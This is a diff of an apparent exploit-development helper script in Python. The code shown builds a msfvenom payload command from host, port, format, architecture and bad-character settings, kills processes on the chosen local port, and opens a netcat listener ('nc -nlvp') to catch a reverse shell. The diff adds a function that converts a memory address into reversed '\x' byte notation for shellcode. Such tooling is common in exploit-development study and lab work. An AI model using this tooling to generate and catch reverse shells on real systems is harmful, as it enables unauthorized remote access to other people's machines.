@@ -102,7 +102,7 @@ def generate_payload():
         [msfvenom, switch_payload, payload, lhost, lport, no_crash, switch_format, format, switch_architecture,
          architecture, switch_badchars, badchars])
 
-    kill_port(lport)  # Kill all processes listening on local port
+    kill_port(lport)  # Kill all processes listening on local port of choice
     nc_listener(lport)
 
 
@@ -115,6 +115,13 @@ def kill_port(lport):
 def nc_listener(lport):
     print(f"Necat listener listening on local port {lport}")
     subprocess.run(f"nc -nlvp {lport}")
+
+
+def reverse_address(address):
+    address = ''.join(reversed(address))
+    reversed_address = '\\x'.join([address[i:i + 2] for i in range(0, len(address), 2)])
+    reversed_address = reversed_address.lower()
+    print('\\x' + reversed_address)
 
 
 def main():
